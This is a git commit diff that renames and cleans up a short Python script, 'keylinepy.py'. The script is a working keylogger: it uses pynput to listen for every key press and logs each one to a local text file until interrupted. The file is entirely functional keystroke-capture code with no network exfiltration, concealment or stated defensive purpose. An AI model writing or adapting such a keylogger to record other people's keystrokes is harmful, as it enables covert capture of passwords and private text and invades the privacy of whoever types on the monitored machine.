5a7c88a36e9aa4b1d4d39dec85dfc9f267a7ca7e
Garrett Clary <claryg0603@protonmail.com>
2018-06-07 14:05:19 -0700

    changed name of of keepy to keylinepy and cleaned up the script

--- keylinepy.py
+++ keylinepy.py
@@ -1,21 +1,23 @@
 #!/usr/bin/env python3
 
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Listener
 import logging
-import sys
 
-log_file = 'log_file.txt'
 
 def keyboard_event(key):
+    log_file = 'log_file.txt'
+
     logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
-    logging.info(str(key))
+    logging.info(key)
 
 def main():
     with Listener(on_press=keyboard_event) as listener:
         listener.join()
 
+
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        sys.exit(0)
+        print('\n')
+        logging.shutdown() 
